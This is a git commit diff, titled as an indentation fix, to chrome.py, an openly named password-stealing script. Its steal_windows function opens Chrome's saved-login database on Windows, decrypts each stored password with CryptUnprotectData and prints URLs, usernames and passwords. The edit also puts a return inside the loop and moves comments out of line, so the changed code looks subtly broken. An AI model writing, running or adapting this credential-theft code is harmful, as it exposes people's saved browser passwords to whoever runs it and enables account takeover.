834599bbcab5753c155656cb3c28a9e4b1040899
Zvonimir Rudinski <zvonimirurdinski@protonmail.ch>
2017-12-12 17:49:56 +0100

    fixed indendation

--- chrome.py
+++ chrome.py
@@ -12,13 +12,13 @@ def steal():
 		print("Sorry, Linux and Mac OSX are not supported yet")
 
 def steal_windows():
-	# Chrome keeps passwords in the %LOCALAPPDATA%\Chrome\User Data\Default\Login Data
-	path = os.getenv('LOCALAPPDATA')  + '\\Chrome\\User Data\\Default\\Login Data'
+	# Chrome keeps passwords in the %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
+	path = os.getenv('LOCALAPPDATA')  + '\\Google\\Chrome\\User Data\\Default\\Login Data'
 	try:
-		# Try to open the SQLite3 database
+	# Try to open the SQLite3 database
 		conn = sqlite3.connect(path)
 		cursor = conn.cursor()
-		# Whoah an error
+	# Whoah an error, happens when the database is locked (Chrome is still open)
 	except:
 		print('[-] Couldn\'t open the database')
 		return
@@ -33,21 +33,21 @@ def steal_windows():
 	# Check if there is any data
 	if len(data) > 0:
 		for result in data:
-	  		# Decrypt the Password
-	  		try:
-				# The good/bad thing about the Chrome passwords is that they are easily decryptable
+		# Decrypt the Password
+			try:
+			# The good/bad thing about the Chrome passwords is that they are easily decryptable
 				password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
 			except:
-				# If it fails no biggie try again
+				# If it fails no biggie try another one
 				pass
 			# If the password is found
 			if password:
 				# If the URL is blank,print it as (Unknown)
 				if(len(result[0]) <= 0):
 					result[0] = "(Unknown)"
-				# Print the result
-				print ("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
-		return
+					# Print the result
+					print ("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
+					return
 	else:
 		print('[-] There are no passwords')
 		return
